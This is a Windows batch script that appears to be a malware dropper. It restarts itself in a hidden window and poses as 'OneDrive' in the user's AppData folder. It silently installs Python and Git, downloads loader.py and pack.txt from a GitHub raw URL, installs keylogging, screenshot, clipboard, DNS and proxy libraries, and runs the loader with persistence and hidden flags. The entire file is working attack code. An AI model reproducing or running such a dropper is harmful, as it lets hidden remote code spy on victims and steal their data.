@echo off
setlocal EnableDelayedExpansion

REM ====================================================
REM Check if already restarted in hidden mode
REM ====================================================
if "%~1" neq "hidden" (
    powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
    exit /B
)

REM ====================================================
REM Configuration
REM ====================================================
set "appName=OneDrive"
set "appDataDir=%APPDATA%\%appName%"
set "pythonVersion=3.13.2"
set "pythonInstallerUrl=https://www.python.org/ftp/python/%pythonVersion%/python-%pythonVersion%-amd64.exe"
set "gitVersion=2.49.0"
set "GitInstallerUrl=https://github.com/git-for-windows/git/releases/download/v%gitVersion%.windows.1/Git-%gitVersion%-64-bit.exe"
set "loaderUrl=https://raw.githubusercontent.com/glyme6139/glyme6139/refs/heads/test/loader.py"
set "packUrl=https://raw.githubusercontent.com/glyme6139/glyme6139/refs/heads/test/pack.txt"
set "tempDir=%TEMP%\%appName%"

REM Loader Arguments (Customize these as needed)
set "loaderArgs=--persist --hidden"


REM ====================================================
REM Create temporary directory
REM ====================================================
mkdir "%tempDir%" 2>nul
goto :Run

REM ====================================================
REM Function: downloadFile
REM Parameters: %1 = URL, %2 = destination path
REM ====================================================
:downloadFile
    echo Downloading %~1 to %~2...
    powershell -Command "Invoke-WebRequest -Uri '%~1' -OutFile '%~2'" 
    if not exist "%~2" (
        echo Download failed: %~1
        exit /b 1
    )
    exit /b 0

REM ====================================================
REM Function: isInstalled
REM Parameter: %1 = program name to check
REM ====================================================
:isInstalled
    where %~1 >nul 2>&1
    if %ERRORLEVEL%==0 (
        echo %~1 is already installed.
        exit /b 0
    )
    exit /b 1

:Run
REM ====================================================
REM Check if Python is installed
REM ====================================================
call :isInstalled python
if %ERRORLEVEL%==0 (
    goto :gitInstall
)

REM Download and install Python
set "pythonInstallerPath=%tempDir%\python-installer.exe"
call :downloadFile "%pythonInstallerUrl%" "%pythonInstallerPath%"
if %ERRORLEVEL% neq 0 (
    echo Failed to download Python installer.
    exit /b 1
)

echo Installing Python...
"%pythonInstallerPath%" InstallAllUser=0 AppendPath=1 /quiet
if %ERRORLEVEL% neq 0 (
    echo Python installation failed.
    exit /b 1
)
echo Python installation complete.

:gitInstall
REM ====================================================
REM Check if Git is installed
REM ====================================================
call :isInstalled git
if %ERRORLEVEL%==0 (
    goto :loader
)

REM Download and install Git
set "gitInstallerPath=%tempDir%\git-installer.exe"
call :downloadFile "%GitInstallerUrl%" "%gitInstallerPath%"
if %ERRORLEVEL% neq 0 (
    echo Failed to download Git installer.
    exit /b 1
)

echo Installing Git...
"%gitInstallerPath%" /SP- /VERYSILENT /NOCANCEL /NORESTART
if %ERRORLEVEL% neq 0 (
    echo Git installation failed.
    exit /b 1
)
echo Git installation complete.

:loader
REM ====================================================
REM Prepare App Data Directory and Download Files
REM ====================================================
mkdir "%appDataDir%" 2>nul
cd "%appDataDir%"

set "loaderPath=%appDataDir%\loader.py"
set "packPath=%appDataDir%\pack.txt"
call :downloadFile "%loaderUrl%" "%loaderPath%"
call :downloadFile "%packUrl%" "%packPath%"

REM ====================================================
REM Install Python modules
REM ====================================================
echo Installing Python modules...
for /f "delims=" %%a in ('powershell -Command "(Get-Command python,py -All|?{$_.Definition -notmatch 'WindowsApps'}|select -First 1).Definition"') do (
    set "pythonPath=%%a"
)

if not defined pythonPath (
    echo Python not found.
    exit /b 1
)

"%pythonPath%" -m pip install --upgrade pip
if %ERRORLEVEL% neq 0 (
    echo Failed to upgrade pip.
    exit /b 1
)

"%pythonPath%" -m pip install cryptography dnslib dnspython gitpython keyboard pyautogui pycryptodome pywin32 tqdm pyperclip PySocks wmi
if %ERRORLEVEL% neq 0 (
    echo Failed to install Python modules.
    exit /b 1
)
echo Python modules installed.

REM ====================================================
REM Run the loader script
REM ====================================================
echo Starting loader...
"%pythonPath%" "%loaderPath%" %loaderArgs%

echo Script completed.
:end
REM (Optional) Clean up temporary directory
REM rmdir /s /q "%tempDir%"

endlocal
exit /b 0